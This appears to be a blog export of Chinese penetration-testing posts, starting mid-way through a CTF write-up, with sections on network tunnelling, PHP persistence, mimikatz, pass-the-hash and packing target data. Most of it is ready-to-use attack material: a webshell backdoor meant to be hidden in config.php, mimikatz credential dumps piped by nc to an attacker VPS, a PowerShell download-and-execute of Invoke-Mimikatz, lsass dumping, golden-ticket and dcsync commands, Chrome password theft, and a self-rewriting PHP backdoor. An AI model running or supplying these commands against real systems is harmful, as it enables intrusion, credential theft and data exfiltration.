'hello';$test= 'flag';if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253') if (@$_SERVER['HTTP_USER_AGENT'] == 'flag')&#123; header("flag:$test");&#125;?&gt; 放进config.php效果最好，因为一般很少人去看这个。 flag获取上面的$shell内容看个人，线下赛可以直接使用&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;之类的，只是说一个点，剩余的发挥空间由你们思考。 最好能写一个批量上传的，结合批量访问。批量访问参考PHP-定时任务或者1234567#!/bin/bashwhile truedo flag=$(curl 'http://172.16.4.42:800') curl --cookie "PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD" --data "key="$&#123;flag&#125; "http://172.16.4.42/index.php/wargame/submit" sleep 1sdone 只有想不到，没有做不到。 日志分析日志分析的用途 感知可能正在发生的攻击，从而规避存在的安全风险 应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 记录log脚本这种脚本网上有很多。12345678910111213&lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数$time = date('Y-m-d H:i:s',time()); //访问时间$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";// log记录$fh = fopen("log.txt", "a");fwrite($fh, $logadd);fclose($fh);?&gt; 日志分析工具 LogForensics 腾讯实验室https://security.tencent.com/index.php/opensource/detail/15 北风飘然@金乌网络安全实验室http://www.freebuf.com/sectool/126698.html 网络ID为piaox的安全从业人员：http://www.freebuf.com/sectool/110644.html 网络ID：SecSkyhttp://www.freebuf.com/sectool/8982.html 网络ID：鬼魅羊羔http://www.freebuf.com/articles/web/96675.html CTF总结意义所在首先，CTF题是信息安全得基本概念，攻防技术、技巧得浓缩和提炼。通过解题，会快速掌握题目中所包含得概念和技术点，而这些知识在真实得环境中可能比较分散，难以学习，高水平得CTF都是由业内专家命题，往往凝聚着他们多年积累出来的技能。 其次，CTF题注重实际操作，并与基础理论知识相结合。每道CTF都需要实际动手才能找到答案，并且在比赛中经常要拼速度，这对攻防操作得能力会有极高的锻炼。除此之外，高质量得CTF题都没法直接使用现成工具解出，一般需要在理解基本原理的基础上，自己编写代码来求解，这个过程会加深和巩固计算机基础知识得理解。 最后，CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。 不要为CTF而CTF虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】代理篇]]></title>
    <url>%2F2017%2F06%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91%E4%BB%A3%E7%90%86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[整合个端口、代理总结，总觉得好难。慢慢来… 适用网络环境有以下几种： 服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3种可以使用SOCKS代理。 判断什么端口能出来VISTA 以下 TCP1FOR /L %i IN (1,1,65535) DO (cmd /c "start /b telnet 151.101.73.147 %i") 用 TELNET 不停的连接你的 1-65535 端口, 你本地开个 TCPDUMP 就行了, 如果连通了, 就 OK 。 UDP1FOR /L %i IN (1,1,65535) DO (cmd /c "start /b nslookup -port=%i rcoil.me 151.101.73.147") 这个速度慢，但是有效。 VISTA 以后 TCP 1function sT($IP,$Port) &#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try &#123; $sock.Connect($End);[Byte[]] $Message = [char[]]"w00tw00t";$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)&#125; catch &#123;&#125;;$Sock.Close();&#125;;1..65535 | %&#123; sT -IP "151.101.73.147" -Port $_ &#125; UDP 1function sU($IP, [int]$Port)&#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = "w00tw00t";$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);&#125;; 1..65535 | %&#123; sU -IP "151.101.73.147" -Port $_ &#125; SSH隧道编辑/etc/ssh/sshd_config文件（服务器端）中：12345GatewayPorts yesPermitRootLogin yesPermitTunnel yes #Tunnel启用ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开 接着重启ssh服务 参数详解：123456789-q Quiet mode. 安静模式-T Disable pseudo-tty allocation. 不占用 shell 了-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了～-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。-R：远程转发-L：本地转发-D：... 端口转发12ssh -qTfnN -L hostport:host:port -l user remote_ip #正向隧道ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道 举个例子12ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是本地端口，本地访问5555就是访问vps的5556。ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是vps的端口，访问vps的5555就是访问本地的5556。 正向代理12345SSH -qTfnN -D port remotehost #直接进行socks代理ssh -qTfnN -D 6080 user@theserver #在本地终端中运行 然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.-q：静默运行 远程转发(反向)12345678910第一步：sudo python -m SimpleHTTPServer 80在目标机子开启80端口服务第二步：ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口第三步：个人PC机器直接使用语句:ssh -p 6666 -qngfNTD 6767 内网用户@VPS这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中 ICMP隧道ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，我们只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，，那么很有可能可以建立一个icmp隧道。缺点是需要root/administrator权限。 icmpshvps上：1234git clone https://github.com/inquisb/icmpsh.gitapt-get install python-impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207 靶机上：1icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128 就会在vps上接到一个cmdshell。 HTTP代理abptts项目地址首先,安装好工具所需的各种py依赖库:12pip install pycrypto 加密库,整个数据加密都要靠这个pip install httplib2 生成好服务端(webshell)，-o用来指定要生成到的目录，然后把生成好的对应类型的代理脚本扔到目标网站目录中，并尝试访问该脚本，如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可，如下:1python abpttsfactory.py -o webshell 前面确认没有问题后,现在开始绑定端口，建立隧道，下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定，-c用来指定webshell的配置文件[这里直接用默认的]，-u 指定webshell的url，关于更多选项用法，看下工具帮助就明白了，都非常简单的:1python abpttsclient.py -c webshell\config.txt -u "http://www.rcoil.com/abptts.aspx" -f 127.0.0.1:1234/127.0.0.1:3389 隧道建立成功后，用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口]，即可访问目标内网中的资源:12mstsc 127.0.0.1:1234putty ssh root@127.0.0.1 -p 1234 -i ~/.ssh/xxx/id_rsa 如果对方的ssh只允许证书登录,加载上自己的证书即可 DNS隧道不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。 Iodine它几乎是和hans icmp隧道工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。使用手册Server端：1iodined -f -c -P password 1.1.1.1 tunneldomain.com Client端：1iodine -f -P password tunneldomain.com -r 成功连接将直接在客户端生成地址1.1.1.2。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过建立C＆C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用）。它还支持端口转发。Server端：1ruby ./dnscat2.rb tunneldomain.com Client端：1./dnscat2 tunneldomain.com 收到Server端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择一个命令会话session -i ：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as'ping'! For a full list of clients, try 'help'.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定靶机上的端口8080，并将所有连接转发到10.0.0.20:80。 TCP隧道shootbackshootback，是由python开发的反向TCP隧道，使得NAT或防火墙后的内网机器可以被外网访问。在800并发下消耗小于1％的CPU和8MB内存。…. SOCKS在实际渗透测试过程中，当我们成功的拿下第一台靶机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。 socks代理工具socks代理其实也可理解为一个增强版的 lcx，它在服务端监听一个服务端口，当有新的连接请求时会从socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能。 网络上Socks代理工具有很多，选用的时候尽可能使用无GUI界面的工具，还有尽可能不需要安装其他依赖软件，能够支持多平台操作系统的更佳。 Earthworm工具网址：http://rootkiter.com/EarthWormEW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以正向、反向、多级级联等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。 目前已经有了最新版Termite，工具网址：http://rootkiter.com/Termite/ 官方提供的方法就已经很好了，配套的Termite更不错，Termite中，只要节点互通，就可以任意切换代理。 正向 SOCKS v5 服务器在具有公网IP时：1./ew -s ssocksd -l 1080 反弹 SOCKS v5 服务器先在一台具有公网 ip :233.233.233.233的主机A上运行以下命令：1./ew -s rcsocks -l 1080 -e 8888 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口 1./ew -s rssocks -d 233.233.233.233 -e 8888 HackTools 可通过访问=233.233.233.233:1080端口使用 rssocks 主机提供的 socks5 代理服务 二级级联环境示意图： 环境说明（一）：V1主机配有2块网卡，一块连通外网，一块10.255.11.8只能连接内网V2主机，无法访问内网其它资源。V2主机可以访问内网资源，但无法访问外网。 12345# V2执行，利用ssocksd方式启动8888端口的socks代理./ew -s ssocksd -l 8888# V1执行，将来自外部的1080端口的代理请求转发到V2的8888端口上./ew -s lcx_tran -l 1080 -f 10.255.11.3 -g 8888# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 环境说明（二）：V1主机没有公网IP，也无法访问内网资源。V2主机可以访问内网资源，但无法访问外网。 1234567# VPS执行，把来自外部的1080端口的流量转到本地的8888端口上./ew –s lcx_listen –l 1080 –e 8888# V2执行，在本地启动socks5代理并监听9999端口./ew -s ssocksd -l 9999# V1执行，把vps的8888端口和V2的9999进行绑定,即建立socks5通道./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.11.3 -g 9999# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 三级级联再提供一个“三级级联”的本地SOCKS测试用例以供参考环境示意图： 环境说明：Web server没有公网IP但可以访问外网，V2主机不能访问外网但可以被Web server主机访问，V3主机可被V2主机访问且能访问核心区域123456789# vps上执行，把来自外部的1080端口流量转到本地的8888端口上./ew -s rcsocks -l 1080 -e 8888 # Web server执行，把vps的8888端口和内网V2的9999端口绑定./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.12.2 -g 9999 # V2执行，将来自外部的7777端口和本地的9999端口进行绑定./ew -s lcx_listen -l 9999 -e 7777 # V3执行，将本地的socks连接反弹到V2的7777端口上./ew -s rssocks -d 10.255.12.2 -e 7777 # Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 数据流向: Attack(SOCKS v5) -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks 更多的内容用力戳戳瞎下面这篇文章。 内网漫游之SOCKS代理大结局这篇文章是我见过最全的SOCKS代理 参考：利用ssh端口转发实现Site-to-Site简易VPN通道利用 DNS 隧道传递数据和命令来绕过防火墙A Red Teamer’s guide to pivoting内网漫游之SOCKS代理大结局SSH如何反向代理稳定穿透内网]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【编程】PHP-定时任务]]></title>
    <url>%2F2017%2F05%2F%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[写一个关于不死进程,其实也就是定时的进程，时间短那就是无限的启用着。之前有些文章也有这一些函数，但是没有备注。 ignore_user_abort() 函数属于杂项函数。ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。 语法1ignore_user_abort(setting) setting为可选项,如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行。如果未设置该参数，会返回当前的设置。 注释PHP 不会检测到用户是否已断开连接，直到尝试向客户机发送信息为止。 set_time_limit() 函数在PHP4，PHP5和PHP7中set_time_limit 是设置脚本最大执行时间 语法1bool set_time_limit ( int $seconds ) seconds最大的执行时间，单位为秒，默认值为30秒。如果设置为0（零），没有时间方面的限制。 file_put_contents() 函数属于Filesystem 函数，这个允许访问和操作文件系统。 file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。 语法1file_put_contents(file,data,mode,context) file为必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。data为可选。规定要写入文件的数据。可以是字符串、数组或数据流。mode为可选。规定如何打开/写入文件。context为可选。规定文件句柄的环境。 usleep() 函数usleep() 函数为杂项函数，作用为延迟代码执行若干微秒。 语法1usleep(microseconds) microseconds是必需填写的。以微秒计的暂停时间。 运用demo.php内容为：12345678910111213141516&lt;?phpignore_user_abort(true);set_time_limit(0);$file = 'demo.php';$shell = "&lt;?php phpinfo();?&gt;"; while (TRUE) &#123; file_put_contents($file, $shell);system('chmod 777 demo.php');usleep(50);&#125;?&gt; 这种小技巧在留后门上还是有些用的，种了多个demo.php，就可以批量获取demo.php界面内容。123456789101112&lt;?php$array = array( "192.168.xxx.xxx", "192.168.xxx.xxx");for($i=0;$i&lt;=1;$i++)&#123;$url = "http://$array[$i]/demo.php";$contents = file_get_contents($url); echo "$array[$i] &lt;br&gt;";echo "$contents &lt;br&gt;&lt;br&gt;";&#125; ?&gt;]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】mimikatz使用技巧]]></title>
    <url>%2F2017%2F03%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91mimikatz%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[mimikatz平时一般使用技巧 0x00 非交换式打印（输出）mimikatz执行过程的log1mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit &amp;&amp; dir 读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问1mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit &gt;&gt; log.txt nc到vps非交互抓明文,不留任何文件,直接把抓取结果用nc发到指定的远程机器(一般是自己的vps)上,可能有些端口出不来,换几个常用的即可,80,8080,443,53……12mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc -vv 192.168.3.251 1234 在目标机器上执行nc -lvp 1234 本地(vps上)机器执行 0x01 两种免杀方式1) 使用powershell1powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds" Tips：powershell 默认windows visa后才有。也可以将结果发送到vps上。 2) procdump lsass 进程导出12C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits 本地使用mimikatz还原123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full 0x02 日常使用1) 黄金票据12345[*] 制作 mimikatz # kerberos::golden /krbtgt:26e67be3519825ba5c9f4f95af987fac /admin:Administrator /domain:rcoil.me /sid:S-1-5-21-3847150913-2250841228-2965060751 /ticket:Administrator.kiribi[*] 使用 mimikatz # kerberos::ptt Administrator.kiribi mimikatz # kerberos::tgt 2) 获取 vpn 密码1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit 3) 浏览器密码1mimikatz.exe privilege::debug log "dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\" /unprotect" exit //读chrome密码 4) 获取某用户的密码1mimikatz lsadump::dcsync /domain:rcoil.me /user:rcoil]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【内网必修】hash传递-ipc$]]></title>
    <url>%2F2017%2F03%2F%E3%80%90%E5%86%85%E7%BD%91%E5%BF%85%E4%BF%AE%E3%80%91hash%E4%BC%A0%E9%80%92-ipc%24%2F</url>
    <content type="text"><![CDATA[这些是刚接触内网的时候了解到的，之前的blog也是写有的。 hsah传递详细原理就看这里：刨根问底：Hash传递攻击原理探究 测试环境：（本机） 目标机:Windows 7 Ultimate 192.168.1.106 攻击机:Linux 4.6.0-kali1-amd64 192.168.1.107 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set LHOST 192.168.1.107LHOST =&gt; 192.168.1.107msf exploit(psexec) &gt; set LPORT 1024LPORT =&gt; 1024msf exploit(psexec) &gt; show optionsModule options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate asPayload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.1.107 yes The listen address LPORT 1024 yes The listen portExploit target: Id Name -- ---- 0 Automaticmsf exploit(psexec) &gt; set RHOST 192.168.1.106RHOST =&gt; 192.168.1.106msf exploit(psexec) &gt; set smbuser rcoilsmbuser =&gt; rcoilmsf exploit(psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4smbpass =&gt; aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4msf exploit(psexec) &gt; exploit [*] Started reverse TCP handler on 192.168.1.107:1024 [*] 192.168.1.106:445 - Connecting to the server...[*] 192.168.1.106:445 - Authenticating to 192.168.1.106:445 as user 'rcoil'...[*] 192.168.1.106:445 - Selecting PowerShell target[*] 192.168.1.106:445 - Executing the payload...[+] 192.168.1.106:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (957487 bytes) to 192.168.1.106[*] Meterpreter session 1 opened (192.168.1.107:1024 -&gt; 192.168.1.106:50209) at 2017-03-02 06:20:15 +0800meterpreter &gt; shellProcess 3460 created.Channel 1 created.Microsoft Windows [�汾 6.1.7600]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\Windows\system32&gt;whoami whoamint authority\system ipc$内网渗透里面不管域还是工作组最先需要介绍的就是ipc连接，这个是内网渗透必修科目，后面绝大多数操作都要基于ipc连接。 ipc$的作用利用IPC$,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。dir、copy、xcopy、move、type 等参数都可以使用 UNC 路径(何为 UNC 路径？简单来讲以 \ 开头的路径就是UNC路径)。 计划任务说到ipc$，最多的就会提到at和schtasks12345678910111213141516171819202122232425262728C:\Users\John\Desktop&gt;md \\192.168.1.67\c$\users\public\base\C:\Users\John\Desktop&gt;copy base.exe \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;copy bat.bat \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;dir \\192.168.1.67\c$\users\public\base\ Volume in drive \\192.168.1.67\c$ is Windows 7 Volume Serial Number is 44F3-57F8 Directory of \\192.168.1.67\c$\users\public\base08/30/2017 02:35 AM &lt;DIR&gt; .08/30/2017 02:35 AM &lt;DIR&gt; ..08/11/2013 12:40 AM 43,520 base.exe08/30/2017 02:32 AM 32 bat.bat 2 File(s) 43,552 bytes 2 Dir(s) 55,193,870,336 bytes freeC:\Users\John\Desktop&gt;at \\192.168.1.67 4:40 c:\users\public\base\bat.batdded a new job with job ID = 1...删除at任务at /delete /y schtasks是at的升级版。123schtasks /create /tn "base" /tr c:\users\public\base\base.bat /sc once /st 4:50 /S 192.168.1.67 /RU System /u admin /p "1"schtasks /run /tn "base" /S 192.168.1.67 /u admin /p "1" /i #立即执行schtasks /F /delete /tn "base" /S 192.168.1.67 /u admin /p "1" /create表示创建计划任务，/tn 表示任务名，/tr指定运行的文件，/sc 是任务运行频率，/st 是执行时间，/s 指定远程机器名或 ip 地址，/ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM，/i 表示立即运行，/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告，/delete是删除任务。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网必修</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】利用目标系统现有工具快速打包目标机器数据]]></title>
    <url>%2F2017%2F03%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%8E%B0%E6%9C%89%E5%B7%A5%E5%85%B7%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[几乎对所有渗透者来讲,初衷或者最终目的无非就是想对目标实施长期监控及数据落地。 在linux机器下的快速打包方式:利用 ‘tar’一般在部署系统时默认都会预先装上,其它还有很多其它的压缩工具,但这里就以最常用的为例。12345678--exclude 排除不打包的文件-c 创建文件-v 显示打包过程-f 指定要打包的文件-z 压缩-X 把要排除的文件名事先写到文件中然后指定它就可以排除多个了-C 解压到指定目录中-p 打包的时候保持原有文件属性 以 gunzip 格式压缩解压:123# find / -name '*.php' -type f | wc -l# tar zcf /tmp/phpfile.tar.gz `find / -name '*.php' -type f` 2&gt; /dev/null &amp;&amp; cd /tmp &amp;&amp; ls ./phpfile.tar.gz &amp;&amp; echo $? &amp;&amp; tar tf phpfile.tar.gz | wc -l 会带上原有的目录结构# tar xf phpfile.tar.gz -C ./ 解压 以 bzip 格式压缩解压:12# tar jcf access.tar.bz access* bzip格式打包压缩文件# tar jxf access.tar.bz zip解压缩 针对大文件的分卷压缩解压:123# tar cjf - /usr/local/apache2/htdocs/ | split -b 1m - www.bz2 2&gt;/dev/null 1m大小分割,直接压缩到当前目录下# cat www.bz2a* | tar xj 分割压缩后的解压方法# ls -lR usr/ 在win机器上的一些快速打包方式7z12345-r 递归压缩-o 指定要输出到的目录-p 指定密码-v 分卷压缩,给的务必要适量,否则文件会非常多a 添加压缩文件 普通压缩解压方式12# 7z.exe -r -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z -oc:\xl 分卷压缩解压方式12# 7z.exe -r -v1m -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z.001 -oc:\xl rar把安装好的winrar安装目录的rar.exe提取出来就可以直接用了,前提是你安装winrar的系统和目标的系统版本要对应,不然可能有些问题(自己觉得库应该是兼容的)123456-a 添加要压缩的文件-p 指定压缩密码-r 递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可-x 指定要排除的文件,单位 k,m,g-v 分卷打包,后面跟上单位就好了,打包大文件会很有用-m3,4 使用较好的压缩方式,速度可能会有些慢 以 rar 格式压缩解压12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 把指定目录下的所有文件[包括所有子目录及子目录中的文件,排除txt文件]带密码压缩,然后把压缩好的文件放到c的根下命名成drupal754.rar# Rar.exe x -padmin c:\drupal754.rar c:\xl 带密码保留原有目录结构解压 以 zip 格式压缩解压[用法同上]12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.zip C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# Rar.exe x -padmin c:\drupal754.zip c:\xl 分卷压缩解压12# Rar.exe a -r -v1m -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 压缩# Rar.exe x -padmin c:\drupal754.part01.rar c:\xl 解压 后话:很显然,通关全文,跟技术几乎没有任何关系[仅仅就是几个小工具的简单使用而已],就当留个备忘吧,留给有需要的朋友,另外,打包的时候务必注意下目标分区的大小,不然空间不够,容易出错,文件的元数据要不要一并保存,正在打包的文件是否被占用什么的,有时候打包可能还会有些小小的问题,相信那对你都不是问题]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
</search>
